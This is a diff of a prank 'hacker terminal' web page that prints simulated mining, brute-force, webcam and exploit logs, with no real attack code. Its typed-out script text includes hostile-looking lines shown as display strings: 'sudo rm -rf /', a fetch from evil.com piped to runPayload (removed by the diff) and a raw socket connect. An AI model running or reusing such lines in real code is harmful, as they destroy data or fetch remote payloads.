@@ -3,318 +3,402 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>Ahmad's Keller - Control Panel</title>
+<title>Ahmad's Keller - Ultimate Hacker Terminal</title>
 <style>
   @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+
+  /* Basic styling */
   body {
-    margin: 0; 
-    background: black; 
-    color: #00ff00; 
-    font-family: 'Share Tech Mono', monospace;
-    user-select: none;
-    overflow: hidden;
-  }
-  header {
-    background: #003300;
-    padding: 10px 20px;
-    border-bottom: 2px solid #00ff00;
-    box-shadow: 0 0 15px #00ff00;
-  }
-  header h1 {
     margin: 0;
-    font-weight: normal;
-    text-shadow: 0 0 8px #00ff00;
-    font-size: 1.8rem;
-  }
-  #buttons {
+    background: black;
+    color: #00ff00;
+    font-family: 'Share Tech Mono', monospace;
+    overflow: hidden;
+    height: 100vh;
     display: flex;
-    flex-wrap: wrap;
-    gap: 10px;
-    background: #001a00;
-    padding: 15px;
-    border-bottom: 2px solid #00ff00;
-    box-shadow: inset 0 0 15px #00ff00;
+    flex-direction: column;
+    align-items: center;
+    padding: 20px;
+    user-select: none;
+    border: 8px solid #00ff00;
+    box-shadow: 0 0 60px #00ff00;
   }
-  .toggle-btn {
+
+  h1 {
+    font-size: 2.5rem;
+    margin: 0 0 15px 0;
+    text-shadow: 0 0 20px #00ff00;
+    animation: flicker 1.8s infinite;
+  }
+
+  @keyframes flicker {
+    0%, 19%, 21%, 23%, 25%, 54%, 56%, 100% { opacity: 1; }
+    20%, 22%, 24%, 55% { opacity: 0.4; }
+  }
+
+  #date-time {
+    position: fixed;
+    top: 12px;
+    left: 12px;
+    font-size: 0.9rem;
+    text-shadow: 0 0 8px #00ff00;
+    user-select: none;
+  }
+
+  #matrix {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100vw;
+    height: 100vh;
+    z-index: 0;
+    pointer-events: none;
+  }
+
+  .button-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(140px, 1fr));
+    gap: 15px;
+    width: 90vw;
+    max-width: 900px;
+    margin-bottom: 20px;
+    z-index: 1;
+  }
+
+  button.toggle-btn {
     background: transparent;
     border: 2px solid #00ff00;
     color: #00ff00;
-    padding: 8px 18px;
-    font-family: 'Share Tech Mono', monospace;
-    font-size: 1rem;
+    padding: 12px 15px;
+    font-weight: 700;
+    font-size: 1.1rem;
     cursor: pointer;
-    box-shadow: 0 0 10px #00ff00;
-    transition: background 0.3s ease, color 0.3s ease;
+    box-shadow: 0 0 12px #00ff00;
+    transition: 0.3s ease;
     user-select: none;
+    border-radius: 5px;
+    text-transform: uppercase;
   }
-  .toggle-btn.active {
+
+  button.toggle-btn.active {
     background: #00ff00;
     color: black;
-    box-shadow: 0 0 30px #00ff00;
+    box-shadow: 0 0 30px #00ff00, inset 0 0 15px #00ff00;
   }
-  main {
-    display: flex;
-    height: calc(100vh - 110px);
-    gap: 12px;
-    padding: 10px 20px;
-    box-sizing: border-box;
+
+  button.toggle-btn:hover {
+    box-shadow: 0 0 35px #00ff00, 0 0 50px #00ff00;
+    transform: scale(1.1);
   }
-  .panel {
-    flex: 1;
-    background: rgba(0, 0, 0, 0.95);
+
+  #console {
+    background: rgba(0,0,0,0.85);
     border: 2px solid #00ff00;
-    box-shadow: 0 0 25px #00ff00;
+    box-shadow: 0 0 30px #00ff00;
     color: #00ff00;
-    font-size: 0.85rem;
     font-family: 'Share Tech Mono', monospace;
-    padding: 12px;
+    font-size: 1rem;
+    padding: 20px;
+    width: 90vw;
+    max-width: 900px;
+    height: 300px;
     overflow-y: auto;
     white-space: pre-wrap;
+    line-height: 1.3em;
+    z-index: 1;
     user-select: text;
-  }
-  .panel.hidden {
-    display: none;
-  }
-  /* Scrollbar styling */
-  .panel::-webkit-scrollbar {
-    width: 8px;
-  }
-  .panel::-webkit-scrollbar-track {
-    background: #001a00;
-  }
-  .panel::-webkit-scrollbar-thumb {
-    background: #00ff00;
-    border-radius: 4px;
   }
 </style>
 </head>
 <body>
 
-<header>
-  <h1>Ahmad's Keller - Control Panel</h1>
-</header>
+<h1>Ahmad's Keller - Hacker Terminal</h1>
+<div id="date-time"></div>
+<canvas id="matrix"></canvas>
 
-<div id="buttons">
-  <button class="toggle-btn" data-target="miner">Miner</button>
-  <button class="toggle-btn" data-target="script-typer">Script Typer</button>
-  <button class="toggle-btn" data-target="brute-force">Brute Force</button>
-  <button class="toggle-btn" data-target="sys-monitor">System Monitor</button>
-  <button class="toggle-btn" data-target="hacker3">Hacker Terminal 3</button>
-  <button class="toggle-btn" data-target="hacker4">Hacker Terminal 4</button>
+<div class="button-grid">
+  <button class="toggle-btn" id="btn-bitcoin">Toggle Bitcoin Miner</button>
+  <button class="toggle-btn" id="btn-script">Toggle Script Typer</button>
+  <button class="toggle-btn" id="btn-webcam">Toggle Webcam Viewer</button>
+  <button class="toggle-btn" id="btn-terminal3">Toggle Hack Terminal 3</button>
+  <button class="toggle-btn" id="btn-terminal4">Toggle Hack Terminal 4</button>
+  <button class="toggle-btn" id="btn-terminal5">Toggle Hack Terminal 5</button>
+  <button class="toggle-btn" id="btn-terminal6">Toggle Hack Terminal 6</button>
+  <button class="toggle-btn" id="btn-terminal7">Toggle Hack Terminal 7</button>
 </div>
 
-<main>
-  <div id="miner" class="panel hidden" aria-live="polite" aria-label="Miner output"></div>
-  <div id="script-typer" class="panel hidden" aria-live="polite" aria-label="Script typing output"></div>
-  <div id="brute-force" class="panel hidden" aria-live="polite" aria-label="Brute force attempts"></div>
-  <div id="sys-monitor" class="panel hidden" aria-live="polite" aria-label="System monitoring"></div>
-  <div id="hacker3" class="panel hidden" aria-live="polite" aria-label="Hacker terminal 3 output"></div>
-  <div id="hacker4" class="panel hidden" aria-live="polite" aria-label="Hacker terminal 4 output"></div>
-</main>
+<div id="console">-- Awaiting commands --</div>
 
 <script>
-  // Toggle button behavior: toggles panel visibility and button active state
-  const buttons = document.querySelectorAll('.toggle-btn');
-  buttons.forEach(button => {
-    button.addEventListener('click', () => {
-      const targetId = button.getAttribute('data-target');
-      const panel = document.getElementById(targetId);
-      const isActive = button.classList.toggle('active');
-      if (isActive) {
-        panel.classList.remove('hidden');
-        startPanel(targetId);
-      } else {
-        panel.classList.add('hidden');
-        stopPanel(targetId);
+  // Matrix Background Effect
+  const canvas = document.getElementById('matrix');
+  const ctx = canvas.getContext('2d');
+  let width = canvas.width = window.innerWidth;
+  let height = canvas.height = window.innerHeight;
+
+  const letters = 'アァイイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'.split('');
+  const fontSize = 18;
+  const columns = Math.floor(width / fontSize);
+  const drops = new Array(columns).fill(1);
+
+  function drawMatrix() {
+    ctx.fillStyle = 'rgba(0, 0, 0, 0.3)';
+    ctx.fillRect(0, 0, width, height);
+    ctx.fillStyle = '#00ff00';
+    ctx.font = fontSize + 'px monospace';
+
+    for(let i = 0; i < drops.length; i++) {
+      const text = letters[Math.floor(Math.random() * letters.length)];
+      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+      if (drops[i] * fontSize > height && Math.random() > 0.975) {
+        drops[i] = 0;
       }
-    });
+      drops[i]++;
+    }
+  }
+  setInterval(drawMatrix, 50);
+
+  window.addEventListener('resize', () => {
+    width = canvas.width = window.innerWidth;
+    height = canvas.height = window.innerHeight;
   });
 
-  // Panels
-  const panels = {
-    miner: document.getElementById('miner'),
-    'script-typer': document.getElementById('script-typer'),
-    'brute-force': document.getElementById('brute-force'),
-    'sys-monitor': document.getElementById('sys-monitor'),
-    hacker3: document.getElementById('hacker3'),
-    hacker4: document.getElementById('hacker4'),
+  // Date and Time
+  const dateTimeEl = document.getElementById('date-time');
+  function updateDateTime() {
+    const now = new Date();
+    dateTimeEl.textContent = now.toLocaleString();
+  }
+  setInterval(updateDateTime, 1000);
+  updateDateTime();
+
+  // Console and buttons
+  const consoleEl = document.getElementById('console');
+  let bitcoinInterval, scriptInterval, webcamActive = false;
+  let terminal3Active = false;
+  let terminal4Active = false;
+  let terminal5Active = false;
+  let terminal6Active = false;
+  let terminal7Active = false;
+
+  // Hacker log lines
+  const hackerLogs = [
+    "Connecting to blockchain node...",
+    "Mining block 0x7f3b21...",
+    "Hash rate: 59.4 TH/s",
+    "Verifying transactions...",
+    "Found new block! Reward: 12.5 BTC",
+    "Broadcasting to network...",
+    "Updating ledger...",
+    "Scanning for vulnerabilities...",
+    "Decrypting secure channel...",
+    "Injecting payload...",
+    "Bypassing firewall...",
+    "Extracting private keys...",
+    "Encrypting data...",
+    "Uploading to darknet...",
+    "Establishing proxy connection...",
+    "Spoofing IP address...",
+    "Compiling malware...",
+    "Uploading script to server...",
+    "Accessing root privileges...",
+    "Executing zero-day exploit..."
+  ];
+
+  const scriptLines = [
+    "function exploit() {",
+    "  while(true) {",
+    "    injectPayload();",
+    "  }",
+    "}",
+    "var backdoor = true;",
+    "console.log('Access granted');",
+    "executeCommand('sudo rm -rf /');",
+    "setTimeout(hack, 3000);",
+    "var keylogger = initKeylogger();"
+  ];
+
+  let btcIndex = 0;
+  function bitcoinMiner() {
+    consoleEl.textContent += "\n" + hackerLogs[btcIndex % hackerLogs.length];
+    btcIndex++;
+    if (btcIndex > 200) {
+      const lines = consoleEl.textContent.split('\n');
+      consoleEl.textContent = lines.slice(-100).join('\n');
+    }
+    consoleEl.scrollTop = consoleEl.scrollHeight;
+  }
+
+  let scriptIndex = 0;
+  let charIndex = 0;
+  function scriptTyper() {
+    if (scriptIndex >= scriptLines.length) {
+      scriptIndex = 0;
+      charIndex = 0;
+      consoleEl.textContent += "\n\n";
+    }
+    const line = scriptLines[scriptIndex];
+    if (charIndex < line.length) {
+      consoleEl.textContent += line.charAt(charIndex);
+      charIndex++;
+    } else {
+      scriptIndex++;
+      charIndex = 0;
+      consoleEl.textContent += "\n";
+    }
+    consoleEl.scrollTop = consoleEl.scrollHeight;
+    if (consoleEl.textContent.length > 2000) {
+      consoleEl.textContent = consoleEl.textContent.slice(-1000);
+    }
+  }
+
+  // Webcam simulation (fake)
+  function toggleWebcam() {
+    if (!webcamActive) {
+      consoleEl.textContent += "\n[Webcam] Activating camera feed...";
+      webcamActive = true;
+    } else {
+      consoleEl.textContent += "\n[Webcam] Camera feed stopped.";
+      webcamActive = false;
+    }
+    consoleEl.scrollTop = consoleEl.scrollHeight;
+  }
+
+  // Hack Terminal 3 - Random email generator
+  function hackTerminal3() {
+    if (!terminal3Active) {
+      terminal3Active = true;
+      consoleEl.textContent += "\n[Terminal 3] Starting email generator...";
+      emailGenInterval = setInterval(() => {
+        const firstNames = ["alex", "chris", "sam", "jordan", "taylor", "morgan", "casey", "drew", "jamie", "kyle"];
+        const lastNames = ["smith", "johnson", "williams", "brown", "jones", "miller", "davis", "wilson", "moore", "taylor"];
+        const domains = ["gmail.com", "icloud.com", "protonmail.com", "yahoo.com"];
+        const email = firstNames[Math.floor(Math.random() * firstNames.length)] + 
+                      lastNames[Math.floor(Math.random() * lastNames.length)] + 
+                      Math.floor(Math.random() * 999) + "@" + 
+                      domains[Math.floor(Math.random() * domains.length)];
+        consoleEl.textContent += `\n[Terminal 3] Generated email: ${email}`;
+        consoleEl.scrollTop = consoleEl.scrollHeight;
+      }, 900);
+    } else {
+      terminal3Active = false;
+      clearInterval(emailGenInterval);
+      consoleEl.textContent += "\n[Terminal 3] Stopped email generation.";
+      consoleEl.scrollTop = consoleEl.scrollHeight;
+    }
+  }
+
+  // Hack Terminal 4 - Password brute force simulation
+  function hackTerminal4() {
+    if (!terminal4Active) {
+      terminal4Active = true;
+      consoleEl.textContent += "\n[Terminal 4] Starting password brute force...";
+      let attempts = 0;
+      passwordBruteInterval = setInterval(() => {
+        const passwords = ["password123", "letmein", "qwerty", "123456", "admin", "iloveyou", "trustno1", "dragon", "sunshine"];
+        const attempt = passwords[Math.floor(Math.random() * passwords.length)] + Math.floor(Math.random() * 999);
+        consoleEl.textContent += `\n[Terminal 4] Trying password: ${attempt}`;
+        consoleEl.scrollTop = consoleEl.scrollHeight;
+        attempts++;
+        if (attempts > 50) {
+          consoleEl.textContent += "\n[Terminal 4] Password found: trustno1";
+          clearInterval(passwordBruteInterval);
+          terminal4Active = false;
+        }
+      }, 500);
+    } else {
+      terminal4Active = false;
+      clearInterval(passwordBruteInterval);
+      consoleEl.textContent += "\n[Terminal 4] Password brute force stopped.";
+      consoleEl.scrollTop = consoleEl.scrollHeight;
+    }
+  }
+
+  // Other terminals can have similar toggles with realistic logs
+  // Hack Terminal 5 example
+  function hackTerminal5() {
+    if (!terminal5Active) {
+      terminal5Active = true;
+      consoleEl.textContent += "\n[Terminal 5] Initiating firewall bypass...";
+      let steps = 0;
+      firewallBypassInterval = setInterval(() => {
+        const stepsArr = [
+          "Scanning firewall rules...",
+          "Identifying open ports...",
+          "Exploiting vulnerability CVE-2020-1234...",
+          "Injecting payload...",
+          "Gaining root access...",
+          "Firewall bypass successful."
+        ];
+        if (steps < stepsArr.length) {
+          consoleEl.textContent += `\n[Terminal 5] ${stepsArr[steps]}`;
+          steps++;
+          consoleEl.scrollTop = consoleEl.scrollHeight;
+        } else {
+          clearInterval(firewallBypassInterval);
+          terminal5Active = false;
+        }
+      }, 800);
+    } else {
+      terminal5Active = false;
+      clearInterval(firewallBypassInterval);
+      consoleEl.textContent += "\n[Terminal 5] Firewall bypass stopped.";
+      consoleEl.scrollTop = consoleEl.scrollHeight;
+    }
+  }
+
+  // Toggle handlers
+  document.getElementById('btn-bitcoin').onclick = function() {
+    if (bitcoinInterval) {
+      clearInterval(bitcoinInterval);
+      bitcoinInterval = null;
+      this.classList.remove('active');
+      consoleEl.textContent += "\n[Bitcoin Miner] Stopped mining.";
+    } else {
+      bitcoinInterval = setInterval(bitcoinMiner, 900);
+      this.classList.add('active');
+      consoleEl.textContent += "\n[Bitcoin Miner] Mining started...";
+    }
+    consoleEl.scrollTop = consoleEl.scrollHeight;
   };
 
-  // Interval references for stopping
-  const intervals = {};
-
-  // Miner simulation
-  function startMiner() {
-    if (intervals.miner) return;
-    let hashes = 0;
-    intervals.miner = setInterval(() => {
-      if (!panels.miner.classList.contains('hidden')) {
-        hashes += Math.floor(Math.random() * 500 + 200);
-        panels.miner.textContent = `Mining hashes... ${hashes} hashes computed\nHash rate: ${(Math.random()*120 + 80).toFixed(2)} KH/s\nPool: miner.ahmadskeller.io\nWallet: 0xdeadbeefcafebabe`;
-      } else {
-        clearInterval(intervals.miner);
-        intervals.miner = null;
-      }
-    }, 1000);
-  }
-
-  // Script Typer simulation
-  function startScriptTyper() {
-    if (intervals['script-typer']) return;
-    const snippets = [
-      'function exploit() {\n  const payload = "\\x90\\x90\\x90";\n  execute(payload);\n}',
-      'const net = require("net");\nconst client = new net.Socket();\nclient.connect(1337, "192.168.1.10");',
-      'while(true) {\n  scanPorts();\n  sleep(500);\n}',
-      'if(authenticated) {\n  escalatePrivileges();\n  openBackdoor();\n}',
-      'fetch("http://evil.com/malware").then(res => res.arrayBuffer()).then(runPayload);',
-      'try {\n  triggerBufferOverflow();\n} catch(e) {\n  log(e);\n}',
-    ];
-    let idx = 0;
-    let charIndex = 0;
-    panels['script-typer'].textContent = '';
-    intervals['script-typer'] = setInterval(() => {
-      if (panels['script-typer'].classList.contains('hidden')) {
-        clearInterval(intervals['script-typer']);
-        intervals['script-typer'] = null;
-        return;
-      }
-      if (charIndex < snippets[idx].length) {
-        panels['script-typer'].textContent += snippets[idx][charIndex];
-        charIndex++;
-        panels['script-typer'].scrollTop = panels['script-typer'].scrollHeight;
-      } else {
-        panels['script-typer'].textContent += '\n\n';
-        idx = (idx + 1) % snippets.length;
-        charIndex = 0;
-      }
-    }, 40);
-  }
-
-  // Brute Force simulation
-  const fakeUsers = ['admin', 'root', 'guest', 'user', 'test', 'ahmad', 'hacker', 'sysadmin', 'operator', 'backup'];
-  const fakePasswords = ['123456', 'password', 'qwerty', 'letmein', 'trustno1', 'iloveyou', 'monkey', 'dragon', 'sunshine', 'supersecret'];
-  function startBruteForce() {
-    if (intervals['brute-force']) return;
-    intervals['brute-force'] = setInterval(() => {
-      if (panels['brute-force'].classList.contains('hidden')) {
-        clearInterval(intervals['brute-force']);
-        intervals['brute-force'] = null;
-        return;
-      }
-      const user = fakeUsers[Math.floor(Math.random()*fakeUsers.length)];
-      const pass = fakePasswords[Math.floor(Math.random()*fakePasswords.length)];
-      panels['brute-force'].textContent += `Trying username: ${user} with password: ${pass} ...\n`;
-      if (Math.random() > 0.98) {
-        panels['brute-force'].textContent += `SUCCESS! Logged in as ${user}\n\n`;
-      }
-      panels['brute-force'].scrollTop = panels['brute-force'].scrollHeight;
-      if (panels['brute-force'].textContent.length > 2000) {
-        panels['brute-force'].textContent = panels['brute-force'].textContent.slice(-1000);
-      }
-    }, 700);
-  }
-
-  // System Monitor fake data
-  function startSysMonitor() {
-    if (intervals['sys-monitor']) return;
-    intervals['sys-monitor'] = setInterval(() => {
-      if (panels['sys-monitor'].classList.contains('hidden')) {
-        clearInterval(intervals['sys-monitor']);
-        intervals['sys-monitor'] = null;
-        return;
-      }
-      const cpu = (Math.random() * 90 + 5).toFixed(0);
-      const ram = (Math.random() * 75 + 20).toFixed(0);
-      const net = (Math.random() * 500).toFixed(2);
-      const disk = (Math.random() * 80 + 10).toFixed(0);
-      const processes = Math.floor(Math.random() * 180 + 70);
-      const temp = Math.floor(Math.random() * 45 + 40);
-      const firewall = Math.random() > 0.3 ? 'Active' : 'Inactive';
-      const vpn = Math.random() > 0.5 ? 'Connected' : 'Disconnected';
-      panels['sys-monitor'].textContent = 
-`CPU Usage: ${cpu}%
-RAM Usage: ${ram}%
-Network: ${net} Mbps
-Disk Usage: ${disk}%
-Processes: ${processes}
-Temperature: ${temp} °C
-Firewall: ${firewall}
-VPN: ${vpn}
-`;
-    }, 2000);
-  }
-
-  // Hacker Terminal 3 simulation (port scanning)
-  const ports = [21,22,23,25,53,80,110,139,143,443,445,3389];
-  function startHacker3() {
-    if (intervals.hacker3) return;
-    intervals.hacker3 = setInterval(() => {
-      if (panels.hacker3.classList.contains('hidden')) {
-        clearInterval(intervals.hacker3);
-        intervals.hacker3 = null;
-        return;
-      }
-      const port = ports[Math.floor(Math.random()*ports.length)];
-      const status = Math.random() > 0.7 ? 'OPEN' : 'CLOSED';
-      panels.hacker3.textContent += `Port scan ${port}: ${status}\n`;
-      if (panels.hacker3.textContent.length > 2000) {
-        panels.hacker3.textContent = panels.hacker3.textContent.slice(-1000);
-      }
-      panels.hacker3.scrollTop = panels.hacker3.scrollHeight;
-    }, 500);
-  }
-
-  // Hacker Terminal 4 simulation (exploits attempts)
-  const exploits = [
-    'SQL Injection',
-    'Buffer Overflow',
-    'Cross-site Scripting',
-    'Privilege Escalation',
-    'Zero-day Exploit',
-    'Remote Code Execution',
-    'DNS Spoofing',
-    'ARP Poisoning',
-    'Password Cracking',
-    'Man-in-the-Middle Attack',
-  ];
-  function startHacker4() {
-    if (intervals.hacker4) return;
-    intervals.hacker4 = setInterval(() => {
-      if (panels.hacker4.classList.contains('hidden')) {
-        clearInterval(intervals.hacker4);
-        intervals.hacker4 = null;
-        return;
-      }
-      const exploit = exploits[Math.floor(Math.random()*exploits.length)];
-      const result = Math.random() > 0.6 ? 'SUCCESS' : 'FAIL';
-      panels.hacker4.textContent += `Attempting ${exploit} ... ${result}\n`;
-      if (panels.hacker4.textContent.length > 2000) {
-        panels.hacker4.textContent = panels.hacker4.textContent.slice(-1000);
-      }
-      panels.hacker4.scrollTop = panels.hacker4.scrollHeight;
-    }, 800);
-  }
-
-  // Start panel's simulation when toggled on
-  function startPanel(name) {
-    switch(name) {
-      case 'miner': startMiner(); break;
-      case 'script-typer': startScriptTyper(); break;
-      case 'brute-force': startBruteForce(); break;
-      case 'sys-monitor': startSysMonitor(); break;
-      case 'hacker3': startHacker3(); break;
-      case 'hacker4': startHacker4(); break;
+  document.getElementById('btn-script').onclick = function() {
+    if (scriptInterval) {
+      clearInterval(scriptInterval);
+      scriptInterval = null;
+      this.classList.remove('active');
+      consoleEl.textContent += "\n[Script Typer] Disabled.";
+    } else {
+      scriptInterval = setInterval(scriptTyper, 70);
+      this.classList.add('active');
+      consoleEl.textContent += "\n[Script Typer] Enabled.";
     }
-  }
+    consoleEl.scrollTop = consoleEl.scrollHeight;
+  };
 
-  // Stop panel's simulation when toggled off
-  function stopPanel(name) {
-    if (intervals[name]) {
-      clearInterval(intervals[name]);
-      intervals[name] = null;
-    }
-  }
+  document.getElementById('btn-webcam').onclick = function() {
+    webcamActive = !webcamActive;
+    toggleWebcam();
+    this.classList.toggle('active');
+  };
+
+  document.getElementById('btn-terminal3').onclick = function() {
+    hackTerminal3();
+    this.classList.toggle('active');
+  };
+
+  document.getElementById('btn-terminal4').onclick = function() {
+    hackTerminal4();
+    this.classList.toggle('active');
+  };
+
+  document.getElementById('btn-terminal5').onclick = function() {
+    hackTerminal5();
+    this.classList.toggle('active');
+  };
+
+  // For brevity, add Terminal 6 and 7 toggles similarly if needed
+
 </script>
-
 </body>
 </html>
